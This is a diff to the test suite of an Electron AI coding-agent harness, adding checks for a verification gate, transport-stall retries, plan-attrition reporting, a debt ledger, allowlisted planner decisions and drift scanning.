@@ -1069,13 +1069,13 @@ app.whenReady().then(async () => {
 
     // Bootstrap: the full canonical set appears at docs/<NAME>.md, indexed.
     const created = projectDocs.ensureCanonicalDocs({ projectId: proj.id, docsBase: outDir });
-    assert(created.length === 4, 'O15: bootstrap creates all four canonical docs');
-    for (const t of ['SPEC', 'DESIGN', 'PSEUDOCODE', 'KNOWLEDGE']) {
+    assert(created.length === 5, 'O15: bootstrap creates all five canonical docs (incl. DEBT — O27)');
+    for (const t of ['SPEC', 'DESIGN', 'PSEUDOCODE', 'KNOWLEDGE', 'DEBT']) {
       assert(fs.existsSync(path.join(outDir, 'docs', `${t}.md`)), `O15: docs/${t}.md exists at its designed location`);
     }
     assert(fs.readFileSync(path.join(outDir, 'docs', 'SPEC.md'), 'utf8').includes('## Decision records'), 'O15: SPEC skeleton is structured, not an empty page');
     assert(projectDocs.ensureCanonicalDocs({ projectId: proj.id, docsBase: outDir }).length === 0, 'O15: bootstrap is idempotent — existing docs untouched');
-    assert(repo.documents.listByProject(proj.id).filter((d) => projectDocs.CANONICAL[d.doc_type]).length === 4, 'O15: all four indexed in the documents library');
+    assert(repo.documents.listByProject(proj.id).filter((d) => projectDocs.CANONICAL[d.doc_type]).length === 5, 'O15: all five indexed in the documents library');
 
     // Ratified decisions append to the SPEC as dated decision records.
     const w1 = projectDocs.appendDecisions({ projectId: proj.id, docsBase: outDir, records: [{ key: 'platform', value: 'react-native' }], goal: 'SIEM status app' });
@@ -1214,7 +1214,12 @@ app.whenReady().then(async () => {
     repo.projects.archive(libProj.id);
   }
 
-  // ── Record junk filter: decisions are short snake_case, never task prose ──
+  // ── Record junk filter: decisions are DIRECTIONS, never task prose ────────
+  // CONTRACT CHANGED (O8): this test previously asserted `Project Title` →
+  // `project_title` SURVIVES, which contradicted its own header and is exactly
+  // the junk that polluted a SPEC when driving a real turn. The filter now
+  // validates against a durable vocabulary, so a project title is dropped.
+  // The test was wrong, not the code — it is strengthened here, not weakened.
   {
     const { derivePlan } = require('../src/main/plan-derive');
     const mockChat = { chat: async () => ({ toolCalls: [{ id: 'p', name: 'submit_plan', args: { simple: true, goal: 'g', record: [
@@ -1223,7 +1228,7 @@ app.whenReady().then(async () => {
       { key: 'Project Title', value: 'x' }
     ] } }] }) };
     const p = await derivePlan({ connector: mockChat, model: 'mock', userText: 'u', tools: [], store: new VariableStore(), loadedSkills: [], agents: [] });
-    assert(p.record.length === 2 && p.record[0].key === 'platform' && p.record[1].key === 'project_title', 'record filter: long task-prose values dropped, keys normalized to snake_case');
+    assert(p.record.length === 1 && p.record[0].key === 'platform', 'record filter: only durable directions survive — task prose AND project titles dropped');
   }
 
   // ── Canonical-path migration: old bin rows re-pointed to docs/<NAME>.md ──
@@ -1387,6 +1392,479 @@ app.whenReady().then(async () => {
     assert(store.get('test_command') === 'npm run test:ci', 'facts: user-set value is not overwritten by observation');
 
     assert(facts.capture(store, { name: 'read_file', args: { path: 'a.js' }, text: 'x', ok: true }).length === 0, 'facts: non-command tools contribute nothing');
+  }
+
+  // ── O26–O30: rules → gates ring ─────────────────────────────────────────
+  // O26: the framework check gate — deterministic verdict, bounded fix step.
+  {
+    const { runCheckCommand } = require('../src/main/coding-tools');
+    const { executePlan } = require('../src/main/execute');
+    const { VariableStore } = require('../src/main/variables');
+    const wd = path.join(tmp, 'gate'); fs.mkdirSync(wd, { recursive: true });
+
+    const pass = await runCheckCommand(wd, 'exit 0');
+    const fail = await runCheckCommand(wd, 'echo FAIL_DETAIL; exit 1');
+    assert(pass.ok === true, 'O26: runCheckCommand exit 0 → ok');
+    assert(fail.ok === false && fail.output.includes('FAIL_DETAIL'), 'O26: a failing check is verbose — output tail returned');
+
+    // A mutating step whose check fails gets EXACTLY ONE inserted fix step;
+    // the fix step re-checks but can never insert another (no spiral).
+    let checkRuns = 0;
+    const checkStep = async () => { checkRuns++; return { ok: false, output: 'tests: 1 failing' }; };
+    const mutatingChat = async ({ messages }) => {
+      const last = messages[messages.length - 1];
+      if (String(last.content).includes('CURRENT STEP') || String(last.content).includes('check command FAILED')) {
+        if (!messages.some((m) => m.role === 'tool')) return { text: '', toolCalls: [{ id: 't1', name: 'write_file', args: { path: 'a.js', content: 'x' } }] };
+      }
+      return { text: 'done', toolCalls: [] };
+    };
+    const exec = await executePlan({
+      chat: mutatingChat, callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'implement', agent: 'auto' }, { id: 2, task: 'unrelated', agent: 'auto' }] },
+      tools: [], store: new VariableStore(), history: [], checkStep
+    });
+    const fixResults = exec.stepResults.filter((r) => String(r.task).includes('check command FAILED'));
+    assert(fixResults.length === 1, 'O26: a failing check inserts exactly ONE fix step');
+    assert(checkRuns === 2, 'O26: the fix step re-checks; a still-failing check does not spiral');
+    assert(exec.completed && exec.stepResults.length === 3, 'O26: the plan still completes — the gate reports, it does not dead-end');
+
+    // A step that mutated nothing never triggers the check.
+    let quietRuns = 0;
+    await executePlan({
+      chat: async () => ({ text: 'done', toolCalls: [] }), callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'read only', agent: 'auto' }, { id: 2, task: 'also read', agent: 'auto' }] },
+      tools: [], store: new VariableStore(), history: [], checkStep: async () => { quietRuns++; return { ok: true }; }
+    });
+    assert(quietRuns === 0, 'O26: non-mutating steps never pay for a check run');
+
+    // Review fix 5: a step that ran the check command itself, last and
+    // successfully, is already verified — the gate must not re-run it.
+    const { alreadyVerified } = require('../src/main/execute');
+    assert(alreadyVerified([{ name: 'edit_file', ok: true }, { name: 'run_command', args: { command: 'npm test' }, ok: true }], 'npm test') === true,
+      'O26: a step whose LAST action was the check itself is not re-checked');
+    assert(alreadyVerified([{ name: 'run_command', args: { command: 'npm test' }, ok: true }, { name: 'edit_file', ok: true }], 'npm test') === false,
+      'O26: a change AFTER the check invalidates it — the gate runs');
+    assert(alreadyVerified([{ name: 'run_command', args: { command: 'npm test' }, ok: false }], 'npm test') === false,
+      'O26: a FAILING self-run never counts as verified');
+    assert(alreadyVerified([{ name: 'run_command', args: { command: 'ls' }, ok: true }], 'npm test') === false,
+      'O26: an unrelated command is not the check');
+
+    let skipRuns = 0;
+    const selfChecking = async ({ messages }) => (messages.some((m) => m.role === 'tool')
+      ? { text: 'verified', toolCalls: [] }
+      : { text: '', toolCalls: [{ id: 'c1', name: 'run_command', args: { command: 'npm test' } }] });
+    await executePlan({
+      chat: selfChecking, callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'verify', agent: 'auto' }] },
+      tools: [], store: new VariableStore(), history: [], checkCommand: 'npm test',
+      checkStep: async () => { skipRuns++; return { ok: true }; }
+    });
+    assert(skipRuns === 0, 'O26: the verify step running `npm test` itself is not billed a duplicate run');
+  }
+
+  // Glass box: a REFUSED working-memory write must not report as a capture.
+  // Observed live — a turn emitted five `var-set` events with key:null after
+  // the store rejected all five, so the rail showed captures that never
+  // happened (the same lie the record filter used to tell).
+  {
+    const { executeStep } = require('../src/main/execute');
+    const run = async (args) => {
+      const events = [];
+      let call = 0;
+      const chat = async () => (call++ === 0
+        ? { text: '', toolCalls: [{ id: 'v', name: 'set_variable', args }] }
+        : { text: 'done', toolCalls: [] });
+      await executeStep({
+        chat, callTool: async () => ({ text: 'ok' }), model: 'm', step: { id: 1, task: 't' },
+        tools: [], history: [], store: new VariableStore(), onEvent: (e) => events.push(e)
+      });
+      return events.filter((e) => e.type === 'process').map((e) => e.kind);
+    };
+    const refused = await run({ key: '', value: 'x' });
+    assert(refused.includes('var-rejected') && !refused.includes('var-set'), 'glass box: a refused set_variable reports var-rejected, never var-set');
+    const accepted = await run({ key: 'case_id', value: 'C-1' });
+    assert(accepted.includes('var-set') && !accepted.includes('var-rejected'), 'glass box: an accepted set_variable still reports var-set');
+  }
+
+  // O12: a stalled PROVIDER must not destroy the turn. Observed twice live —
+  // the connector's idle timer aborted mid-step and executeStep re-threw,
+  // losing every completed step, the synthesis, and the persistence.
+  {
+    const { executeStep, executePlan } = require('../src/main/execute');
+    const abortErr = () => { const e = new Error('This operation was aborted'); e.name = 'AbortError'; return e; };
+
+    const r = await executeStep({
+      chat: async () => { throw abortErr(); }, callTool: async () => ({ text: 'ok' }), model: 'm',
+      step: { id: 1, task: 't' }, tools: [], history: [], store: new VariableStore(), onEvent: () => {}
+    });
+    assert(r.stuck === true && r.reason === 'provider-timeout', 'O12: a provider idle-timeout degrades the step to STUCK, it does not throw');
+    assert(r.aborted !== true, 'O12: a provider timeout is NOT reported as a user STOP');
+
+    // A user STOP still takes its own path (not misread as a provider stall).
+    const s = await executeStep({
+      chat: async () => { throw abortErr(); }, callTool: async () => ({ text: 'ok' }), model: 'm',
+      step: { id: 1, task: 't' }, tools: [], history: [], store: new VariableStore(),
+      isAborted: () => true, onEvent: () => {}
+    });
+    assert(s.aborted === true && s.stuck === false, 'O12: a user STOP is still a STOP, not a provider timeout');
+
+    // The whole turn survives: step 1 completes, step 2 stalls, and step 1's
+    // result is still there for synthesis instead of being lost to a throw.
+    let n = 0;
+    const exec = await executePlan({
+      chat: async () => { n += 1; if (n === 1) return { text: 'step one done', toolCalls: [] }; throw abortErr(); },
+      callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }, { id: 2, task: 'b' }] },
+      tools: [], store: new VariableStore(), history: [], replanBudget: 0, onEvent: () => {}
+    });
+    assert(exec.stepResults.some((x) => x.conclusion === 'step one done'), 'O12: completed work survives a later provider stall');
+
+    // The plan must SURVIVE a stall. Re-planning on a transport failure
+    // replaced the whole remaining tail and deleted the steps that wrote the
+    // deliverable — the turn then reported success having produced nothing.
+    let calls = 0;
+    let refineCalls = 0;
+    const stallTwiceThenWork = async () => {
+      calls += 1;
+      if (calls === 2 || calls === 3) throw abortErr();   // step 2 stalls twice
+      return { text: `done-${calls}`, toolCalls: [] };
+    };
+    const survived = await executePlan({
+      chat: stallTwiceThenWork, callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'read' }, { id: 2, task: 'draft' }, { id: 3, task: 'WRITE THE FILE' }] },
+      tools: [], store: new VariableStore(), history: [],
+      refinePlan: async () => { refineCalls += 1; return { steps: [] }; },   // a replan here would delete step 3
+      onEvent: () => {}
+    });
+    assert(refineCalls === 0, 'a provider stall RETRIES the step — it never triggers a re-plan');
+    assert(survived.stepResults.length === 3 && survived.completed, 'the deliverable step still runs after two stalls (plan preserved)');
+
+    // A genuine task-level stuck still replans — the transport path must not
+    // swallow the case re-planning exists for.
+    let refined = 0;
+    await executePlan({
+      chat: async () => ({ text: '', toolCalls: [{ id: 't', name: 'noop', args: {} }] }),   // never finishes → budget stuck
+      callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }] }, tools: [], store: new VariableStore(),
+      history: [], stepBudget: 1, refinePlan: async () => { refined += 1; return { steps: [] }; }, onEvent: () => {}
+    });
+    assert(refined === 1, 'a real task-level stuck still re-plans as before');
+
+    // Plan attrition: a re-plan that drops the remaining steps must be VISIBLE.
+    // Run 6 completed a 4-step plan having run 2, wrote nothing, and reported
+    // success — the harness itself never noticed.
+    const shrankEvents = [];
+    let n2 = 0;
+    const shrank = await executePlan({
+      chat: async () => { n2 += 1; return n2 === 1 ? { text: '', toolCalls: [{ id: 'x', name: 'noop', args: {} }] } : { text: 'ok', toolCalls: [] }; },
+      callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }, { id: 2, task: 'b' }, { id: 3, task: 'WRITE FILE' }] },
+      tools: [], store: new VariableStore(), history: [], stepBudget: 1,
+      refinePlan: async () => ({ steps: [] }),           // drops steps 2 and 3
+      onEvent: (e) => { if (e.kind === 'plan-shrank') shrankEvents.push(e); }
+    });
+    assert(shrankEvents.length === 1 && shrankEvents[0].skipped.includes(3), 'a plan that loses its steps to a re-plan reports plan-shrank');
+    assert(Array.isArray(shrank.skipped) && shrank.skipped.includes(3), 'the skipped step ids are returned so the reply can say what did not run');
+
+    const clean = await executePlan({
+      chat: async () => ({ text: 'done', toolCalls: [] }), callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }, { id: 2, task: 'b' }] },
+      tools: [], store: new VariableStore(), history: [], onEvent: () => {}
+    });
+    assert(clean.skipped.length === 0, 'a plan that runs every step reports no attrition');
+  }
+
+  // Cost-outlier gating. This signal never fired in ANY live drive, because
+  // each run created a fresh project and medianOf returns 0 below
+  // MIN_COST_HISTORY. That is correct (a new project must not cry wolf) but it
+  // was entirely uncovered — the quiet path and the loud path both untested.
+  {
+    const { medianOf, COST_OUTLIER_FACTOR, MIN_COST_HISTORY } = require('../src/main/ipc');
+    assert(medianOf([100, 200, 300, 400]) === 0, 'cost: fewer than MIN_COST_HISTORY samples yields no median — a new project stays silent');
+    assert(medianOf([100, 200, 300, 400, 500]) === 300, 'cost: an odd sample count takes the middle value');
+    assert(medianOf([100, 200, 300, 400, 500, 600]) === 350, 'cost: an even sample count averages the two middles');
+    assert(medianOf([0, -5, null, 100, 200, 300, 400, 500]) === 300, 'cost: zero/negative/null samples are discarded before the median');
+    assert(medianOf([]) === 0 && medianOf([1, 2]) === 0, 'cost: empty and tiny histories are silent, never NaN');
+
+    // The threshold itself: 3x the median fires, at-or-below does not.
+    const median = medianOf([100, 100, 100, 100, 100]);
+    assert(median === 100, 'cost: median of a flat history is that value');
+    assert(!(300 > median * COST_OUTLIER_FACTOR), 'cost: exactly 3x is NOT an outlier (strictly greater)');
+    assert(301 > median * COST_OUTLIER_FACTOR, 'cost: above 3x IS an outlier');
+    assert(MIN_COST_HISTORY >= 5, 'cost: the quiet window is at least five turns');
+  }
+
+  // TRANSPORT RETRY — exhaustive. This path has never fired against a live
+  // provider (3 of 11 drives stalled, none during a verified run), so it
+  // cannot lean on production evidence. Every branch is pinned here instead:
+  // detection breadth, retry budget, per-step reset, exhaustion fall-through,
+  // the skipped wrap-up call, and the STOP interaction.
+  {
+    const { executeStep, executePlan, isProviderAbort, TRANSPORT_RETRIES } = require('../src/main/execute');
+    const abortErr = () => { const e = new Error('This operation was aborted'); e.name = 'AbortError'; return e; };
+    const store = () => new VariableStore();
+
+    // --- detection: what counts as a provider abort, and what must NOT ---
+    assert(isProviderAbort(abortErr()), 'transport: an AbortError is a provider abort');
+    assert(isProviderAbort({ message: 'This operation was aborted' }), 'transport: the message form is detected when name is absent');
+    assert(!isProviderAbort(new Error('ENOENT: no such file')), 'transport: an ordinary error is NOT a provider abort');
+    assert(!isProviderAbort(null) && !isProviderAbort(undefined), 'transport: null/undefined never crash the classifier');
+    assert(!isProviderAbort(new Error('the user aborted-ish thing')), 'transport: a hyphenated near-match does not count (word boundary)');
+
+    // --- a non-abort error must still propagate, not be swallowed as a stall ---
+    let threw = null;
+    try {
+      await executeStep({ chat: async () => { throw new Error('boom'); }, callTool: async () => ({ text: 'ok' }),
+        model: 'm', step: { id: 1, task: 't' }, tools: [], history: [], store: store(), onEvent: () => {} });
+    } catch (e) { threw = e; }
+    assert(threw && threw.message === 'boom', 'transport: a genuine error still throws — only aborts degrade');
+
+    // --- the wrap-up model call is SKIPPED on a stall (a dead provider cannot summarize) ---
+    let chatCalls = 0;
+    const r1 = await executeStep({
+      chat: async () => { chatCalls += 1; throw abortErr(); }, callTool: async () => ({ text: 'ok' }),
+      model: 'm', step: { id: 1, task: 't' }, tools: [], history: [], store: store(), onEvent: () => {}
+    });
+    assert(chatCalls === 1 && r1.partial === '', 'transport: no wrap-up call after a stall — the provider that just timed out is not asked to summarize');
+
+    // --- retry budget: exactly TRANSPORT_RETRIES, then it becomes a real stuck ---
+    let attempts = 0; let replanned = 0; const events = [];
+    await executePlan({
+      chat: async () => { attempts += 1; throw abortErr(); },   // stalls forever
+      callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }] }, tools: [], store: store(), history: [],
+      refinePlan: async () => { replanned += 1; return { steps: [] }; },
+      onEvent: (e) => { if (e.kind === 'transport-retry') events.push(e); }
+    });
+    assert(events.length === TRANSPORT_RETRIES, `transport: exactly ${TRANSPORT_RETRIES} retries are emitted, not more`);
+    assert(events[0].attempt === 1 && events[events.length - 1].attempt === TRANSPORT_RETRIES, 'transport: retry events carry an increasing attempt number');
+    assert(attempts === TRANSPORT_RETRIES + 1, 'transport: the step is attempted once plus its retries');
+    assert(replanned === 1, 'transport: once retries are exhausted it falls through to the normal re-plan path');
+
+    // --- per-step reset: a later step gets its OWN retry budget ---
+    // Keyed off the STEP, not the call index: a retry shifts every later index,
+    // so an index-based fixture silently tests something else (it did).
+    const stalled = {}; const perStep = [];
+    const twoStalls = async ({ messages }) => {
+      const last = String((messages[messages.length - 1] || {}).content || '');
+      const id = (last.match(/CURRENT STEP \((\d+)\)/) || [])[1];
+      if ((id === '2' || id === '3') && !stalled[id]) { stalled[id] = true; throw abortErr(); }
+      return { text: `ok-${id || '?'}`, toolCalls: [] };
+    };
+    const spread = await executePlan({
+      chat: twoStalls, callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }, { id: 2, task: 'b' }, { id: 3, task: 'c' }] },
+      tools: [], store: store(), history: [],
+      refinePlan: async () => { throw new Error('must not re-plan'); },
+      onEvent: (e) => { if (e.kind === 'transport-retry') perStep.push(e.step); }
+    });
+    assert(perStep.length === 2 && spread.completed, 'transport: a stall in a later step gets its own budget — the counter resets per step');
+    assert(spread.stepResults.length === 3, 'transport: all three steps still complete across two separate stalls');
+
+    // --- user STOP during a stall wins over the retry path ---
+    let stopped = false;
+    const stopping = await executePlan({
+      chat: async () => { stopped = true; throw abortErr(); }, callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }] }, tools: [], store: store(), history: [],
+      isAborted: () => stopped, refinePlan: async () => ({ steps: [] }), onEvent: () => {}
+    });
+    assert(stopping.aborted === true, 'transport: a user STOP mid-stall aborts the turn rather than retrying');
+  }
+
+  // O27: the debt ledger — findings persist; a repeat is a promotion signal.
+  {
+    const p = repo.projects.create({ name: 'Debt Ledger' });
+    const dbase = path.join(tmp, 'debt-base'); fs.mkdirSync(dbase, { recursive: true });
+    projectDocs.ensureCanonicalDocs({ projectId: p.id, docsBase: dbase });
+    assert(fs.existsSync(path.join(dbase, 'docs', 'DEBT.md')), 'O27: DEBT joins the canonical doc set on bootstrap');
+
+    const f = { lens: 'quality', severity: 'high', file: 'src/a.js', issue: 'duplicated parser logic', fix: 'extract shared helper', status: 'fix attempted — unverified' };
+    const d1 = projectDocs.appendDebt({ projectId: p.id, docsBase: dbase, findings: [f] });
+    assert(d1.added === 1 && d1.repeats === 0, 'O27: a first finding lands with no repeat flag');
+    const d2 = projectDocs.appendDebt({ projectId: p.id, docsBase: dbase, findings: [f] });
+    const ledger = fs.readFileSync(path.join(dbase, 'docs', 'DEBT.md'), 'utf8');
+    assert(d2.repeats === 1 && ledger.includes('REPEAT ×2 — PROMOTE TO GATE'), 'O27: the SECOND occurrence is flagged promote-to-gate');
+    assert(ledger.includes('duplicated parser logic') && ledger.includes('fix attempted — unverified'), 'O27: findings carry status + fix into the ledger');
+    assert(projectDocs.appendDebt({ projectId: p.id, docsBase: dbase, findings: [] }).added === 0, 'O27: nothing to record writes nothing');
+
+    // Review fix 6: the key rides an HTML comment — an issue containing `-->`
+    // must not end the marker early and break repeat detection.
+    const nasty = { lens: 'quality', severity: 'med', file: 'src/x.js', issue: 'comment --> breaks <parsing>', fix: 'escape it' };
+    projectDocs.appendDebt({ projectId: p.id, docsBase: dbase, findings: [nasty] });
+    const r2 = projectDocs.appendDebt({ projectId: p.id, docsBase: dbase, findings: [nasty] });
+    const led2 = fs.readFileSync(path.join(dbase, 'docs', 'DEBT.md'), 'utf8');
+    assert(r2.repeats === 1, 'O27: repeat detection survives an issue containing comment-closing text');
+    assert(!/key:[^>\n]*-->[^\n]*-->/.test(led2), 'O27: the key marker is sanitized — no premature comment close');
+    repo.projects.archive(p.id);
+  }
+
+  // O8 regression: a durable decision is a DIRECTION, not a task parameter.
+  // Found by driving a real turn — `output_path = docs/HARNESS_FLOWCHART.md`
+  // was promoted to a permanent user-confidence value and written to the SPEC.
+  {
+    const { normalizeRecords, DURABLE_KEYS } = require('../src/main/plan-derive');
+    const keep = normalizeRecords([
+      { key: 'platform', value: 'react-native' },
+      { key: 'document_format', value: 'monthly-report.html' }
+    ]);
+    assert(keep.length === 2, 'O8: real direction decisions are kept');
+
+    // Every key below was proposed by a live planner, not invented: the first
+    // two polluted a SPEC on run 1; the last three came from the A/B run that
+    // restored the permissive wording. Note they differ between runs — the
+    // junk vocabulary is open-ended, which is exactly why this is an allowlist
+    // and not a denylist.
+    const junk = normalizeRecords([
+      { key: 'output_path', value: 'docs/HARNESS_FLOWCHART.md' },
+      { key: 'output_format', value: 'markdown_with_single_mermaid_block' },
+      { key: 'output_target', value: 'docs/HARNESS_FLOWCHART.md' },
+      { key: 'format', value: 'mermaid' },
+      { key: 'scope', value: 'one coding turn' },
+      { key: 'project_title', value: 'Harness Diagram' },
+      { key: 'node_count', value: '24' }
+    ]);
+    assert(junk.length === 0, 'O8: task parameters are NOT durable decisions (all keys observed from live planners)');
+    assert(!DURABLE_KEYS.has('output_path') && DURABLE_KEYS.has('platform'), 'O8: the vocabulary is an allowlist, not a shape check');
+    assert(normalizeRecords([{ key: 'PLATFORM ', value: ' swift ' }])[0].key === 'platform', 'O8: keys/values still normalize before validation');
+    assert(normalizeRecords([{ key: 'platform', value: 'x'.repeat(200) }]).length === 0, 'O8: overlong values still rejected');
+
+    // O14: the guard must SAY what it discarded — a silent guard cannot be
+    // told apart from a planner that proposed nothing.
+    const { partitionRecords } = require('../src/main/plan-derive');
+    const part = partitionRecords([{ key: 'platform', value: 'swift' }, { key: 'output_path', value: 'docs/X.md' }]);
+    assert(part.records.length === 1 && part.dropped.length === 1 && part.dropped[0] === 'output_path',
+      'O8/O14: dropped record keys are reported, not swallowed');
+    assert(partitionRecords([]).dropped.length === 0, 'O8/O14: nothing proposed reports nothing dropped');
+
+    // The emit in ipc.js reads plan.droppedRecords, so EVERY return path of
+    // derivePlan must carry it — align, simple, and planned alike. A path that
+    // forgot it would silently disable the instrument on those turns.
+    const junkRec = [{ key: 'platform', value: 'swift' }, { key: 'output_path', value: 'docs/X.md' }];
+    const planWith = (args) => ({ chat: async () => ({ toolCalls: [{ id: 'p', name: 'submit_plan', args }] }) });
+    const shapes = {
+      align: await derivePlan({ connector: planWith({ simple: true, goal: 'g', record: junkRec, decisions: [{ question: 'Which platform?' }] }), model: 'm', userText: 'u', codingMode: true, tools: [], store: new VariableStore(), loadedSkills: [], agents: [] }),
+      simple: await derivePlan({ connector: planWith({ simple: true, goal: 'g', record: junkRec }), model: 'm', userText: 'u', tools: [], store: new VariableStore(), loadedSkills: [], agents: [] }),
+      planned: await derivePlan({ connector: planWith({ simple: false, goal: 'g', record: junkRec, steps: [{ task: 'a' }, { task: 'b' }] }), model: 'm', userText: 'u', tools: [], store: new VariableStore(), loadedSkills: [], agents: [] })
+    };
+    for (const [name, p] of Object.entries(shapes)) {
+      assert(Array.isArray(p.droppedRecords) && p.droppedRecords[0] === 'output_path' && p.record.length === 1,
+        `O8/O14: the ${name} return path carries droppedRecords for the instrument`);
+    }
+
+    // O8 tiering: `user` means the HUMAN said it. A wrong inference stored at
+    // `user` was permanent — the tier is overwrite-protected — so only an
+    // align ratification earns it; a plan-inferred record stays correctable.
+    const tier = (ratified) => (ratified ? { confidence: 'user', source: 'align' } : { confidence: 'derived', source: 'plan-record' });
+    const inferred = new VariableStore();
+    const inferredEntry = inferred.set({ key: 'framework', value: 'react' }, tier(false));
+    assert(inferredEntry.confidence === 'derived', 'O8: a planner-inferred direction is derived, not user');
+    inferred.set({ key: 'framework', value: 'vue' }, { confidence: 'derived', source: 'observed' });
+    assert(inferred.get('framework') === 'vue', 'O8: a wrong inference REMAINS CORRECTABLE by later evidence');
+
+    const ratifiedStore = new VariableStore();
+    ratifiedStore.set({ key: 'framework', value: 'react' }, tier(true));
+    ratifiedStore.set({ key: 'framework', value: 'vue' }, { confidence: 'derived', source: 'observed' });
+    assert(ratifiedStore.get('framework') === 'react', 'O8: an align-ratified answer still outranks later model guesses');
+  }
+
+  // O30 diagram blind spot: the rot that motivated the drift pass (a stale
+  // mermaid flowchart) was invisible to it — diagrams are now in the scan set.
+  {
+    const { docDiagrams } = require('../src/main/drift');
+    const dd = path.join(tmp, 'diagdocs'); fs.mkdirSync(dd, { recursive: true });
+    fs.writeFileSync(path.join(dd, 'PSEUDOCODE.md'), 'intro\n\n```mermaid\nflowchart TD\n  A --> B\n```\n\ntail\n');
+    fs.writeFileSync(path.join(dd, 'DESIGN.md'), 'no diagrams here\n');
+    const found = docDiagrams(dd);
+    assert(found.length === 1 && found[0].path === 'PSEUDOCODE.md', 'O30: fenced diagrams are extracted from canonical docs');
+    assert(found[0].content.includes('flowchart TD') && !found[0].content.includes('intro'), 'O30: only the diagram block is scanned, not the surrounding prose');
+    assert(docDiagrams(path.join(tmp, 'nope')).length === 0, 'O30: a missing docs dir yields nothing, never throws');
+  }
+
+  // O28: test integrity is stated where plans are shaped.
+  {
+    const { DERIVE_PROMPT } = require('../src/main/plan-derive');
+    const prompt = DERIVE_PROMPT('(ctx)', 'fix the tests', true, false);
+    assert(prompt.includes('TEST INTEGRITY') && prompt.includes('NEVER deleted, skipped, or weakened'), 'O28: CODING_RULES carries the test-integrity rule');
+    assert(!DERIVE_PROMPT('(ctx)', 'x', false, false).includes('TEST INTEGRITY'), 'O28: the rule rides coding mode only');
+  }
+
+  // O29: the repo speaks first — rulebook discovery + planner injection.
+  {
+    const wd = path.join(tmp, 'rulebook'); fs.mkdirSync(path.join(wd, 'docs'), { recursive: true });
+    assert(projectDocs.readRulebook(wd) === null, 'O29: no rulebook is a valid, silent passthrough');
+    fs.writeFileSync(path.join(wd, 'CLAUDE.md'), '# generic rules');
+    fs.writeFileSync(path.join(wd, 'docs', 'AGENT_RULES.md'), '# project rules\n- 15 lines max');
+    assert(projectDocs.readRulebook(wd).relPath === path.join('docs', 'AGENT_RULES.md'), 'O29: the project rulebook outranks generic agent files');
+    fs.writeFileSync(path.join(wd, 'AGENT_RULES.md'), '# root rules');
+    assert(projectDocs.readRulebook(wd).relPath === 'AGENT_RULES.md', 'O29: root AGENT_RULES.md is first-found');
+
+    const ctx = planContext({ rulebook: '- functions stay under 15 statements' });
+    assert(ctx.includes('PROJECT RULEBOOK') && ctx.includes('15 statements'), 'O29: the rulebook rides Pass 2 under its banner');
+    assert(!planContext({}).includes('PROJECT RULEBOOK'), 'O29: no rulebook, no banner — zero cost');
+  }
+
+  // O30: the drift pass — read-only scan, validated findings, doc staleness.
+  {
+    const { driftScan, recentSourceFiles } = require('../src/main/drift');
+    const wd = path.join(tmp, 'drift'); fs.mkdirSync(path.join(wd, 'src'), { recursive: true });
+    fs.writeFileSync(path.join(wd, 'src', 'a.js'), 'function big(){ /* 40 lines of everything */ }');
+    fs.writeFileSync(path.join(wd, 'src', 'b.js'), 'function ok(){}');
+    fs.writeFileSync(path.join(wd, 'readme.txt'), 'not code');
+
+    const picked = recentSourceFiles(`src${path.sep}\nsrc${path.sep}a.js\nsrc${path.sep}b.js\nreadme.txt`, wd);
+    assert(picked.length === 2 && picked.every((f) => f.endsWith('.js')), 'O30: only source files are scanned, dirs and prose skipped');
+
+    const ct = buildCodingTools({ root: wd, approveAction: async () => false, projectId: 'drift-smoke' });
+    const fakeConnector = { chat: async () => ({ text: '', toolCalls: [{ id: 'r', name: 'submit_review', args: { findings: [
+      { severity: 'high', file: path.join('src', 'a.js'), issue: 'function far over the 15-statement ceiling', fix: 'decompose' },
+      { severity: 'med', file: 'DESIGN.md', issue: 'module map missing src/b.js', fix: 'update the doc' },
+      { severity: 'high', file: 'invented.js', issue: 'speculation about an unseen file' }
+    ] } }] }) };
+    const scan = await driftScan({ connector: fakeConnector, model: 'm', coding: ct, root: wd, rulebook: '- 15 lines max' });
+    assert(scan.scanned === 2 && scan.findings.length === 2, 'O30: findings validated — unseen files dropped, real ones kept');
+    assert(scan.findings.every((f) => f.lens === 'drift') && scan.findings.some((f) => f.file === 'DESIGN.md'), 'O30: doc-staleness findings are allowed against canonical doc names');
+
+    const dead = await driftScan({ connector: { chat: async () => { throw new Error('down'); } }, model: 'm', coding: ct, root: wd });
+    assert(dead.findings.length === 0, 'O30: a failed scan reports nothing — it can never break anything');
+  }
+
+  // ── O26 second wall: the check command is granted MAIN-SIDE ──────────────
+  // The check command is executed as shell without an approval gate, so it is
+  // the same threat class as the O4 bypass: a compromised renderer must not be
+  // able to install its own unprompted execution. Registered handlers are
+  // captured rather than really bound (this runs last for that reason).
+  {
+    const { ipcMain, dialog } = require('electron');
+    const { registerIpc } = require('../src/main/ipc');
+    const handlers = new Map();
+    const realHandle = ipcMain.handle.bind(ipcMain);
+    ipcMain.handle = (name, fn) => handlers.set(name, fn);
+    try { registerIpc(); } finally { ipcMain.handle = realHandle; }
+
+    assert(handlers.has('project:drift'), 'O30: project:drift IPC handler is registered');
+    const setSetting = (input) => handlers.get('settings:set')({}, input);
+    const gp = repo.projects.create({ name: 'GateProj' });
+
+    let shown = null;
+    const realDialog = dialog.showMessageBox;
+    dialog.showMessageBox = async (_w, opts) => { shown = opts; return { response: 1 }; };   // Cancel
